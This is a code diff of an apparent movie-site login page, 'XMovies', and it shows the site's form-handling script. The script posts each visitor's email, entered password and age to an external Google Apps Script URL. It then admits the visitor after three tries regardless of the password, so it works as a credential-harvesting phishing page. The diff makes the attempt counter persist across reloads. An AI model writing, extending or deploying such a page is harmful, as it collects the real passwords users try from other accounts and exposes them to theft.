@@ -42,7 +42,6 @@ button:hover{ transform:scale(1.05); box-shadow:0 0 25px red; }
 
   <div class="contact">Contact Us</div>
 
-  <!-- Instagram -->
   <div class="insta-box">
     <div class="insta" onclick="window.location.href='insta.html'">
       <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
@@ -52,9 +51,8 @@ button:hover{ transform:scale(1.05); box-shadow:0 0 25px red; }
 </div>
 
 <script>
-let attempts = 0;
+const correctPassword = "1234";
 const maxAttempts = 3;
-const correctPassword = "1234"; 
 const sheetUrl = "https://script.google.com/macros/s/AKfycbwhAztXlBe8D9aDEXF7MeOQ0HBEKwKjJm25j2lVoXzDl-bM5VIwyVvh89tpKsxoMWus/exec";
 
 function go(){
@@ -63,15 +61,18 @@ function go(){
   const age = document.getElementById("age").value;
   const error = document.getElementById("errorMsg");
 
+  let attempts = parseInt(localStorage.getItem("xmovies_attempts") || "0");
   attempts++;
+  localStorage.setItem("xmovies_attempts", attempts);
 
-  if(pw === correctPassword || attempts === maxAttempts){
+  if(pw === correctPassword || attempts >= maxAttempts){
     fetch(sheetUrl, {
       method: "POST",
       headers: {'Content-Type': 'application/x-www-form-urlencoded'},
       body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=${encodeURIComponent(age)}&form=XMovies`
     }).then(()=>{
-      window.location.href="movies.html"; 
+      localStorage.removeItem("xmovies_attempts");
+      window.location.href="movies.html";
     });
   } else {
     error.innerText = "Password incorrect";
